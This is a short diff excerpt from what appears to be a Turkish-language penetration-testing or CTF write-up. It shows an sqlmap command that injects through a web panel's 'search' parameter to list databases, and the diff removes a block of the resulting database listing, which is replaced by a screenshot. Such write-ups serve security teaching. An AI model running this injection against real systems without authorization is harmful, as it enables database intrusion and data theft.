@@ -125,15 +125,6 @@ Panelde bir arama alanı bulunuyordu. Ekranda ID, username gibi kolonlarla birli
 sqlmap -r req.txt -p search --dbs --batch --fresh-queries
 ```
 
-```
-available databases [6]:
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] phpmyadmin
-[*] recruit_db
-[*] sys
-```
 <img width="1215" height="587" alt="sqlçıktısı" src="https://github.com/user-attachments/assets/216c958c-5b9b-46ac-ac14-0345e144f3ca" />
 
 Hedef uygulamayla doğrudan ilişkili olan `recruit_db` veritabanına odaklandım.
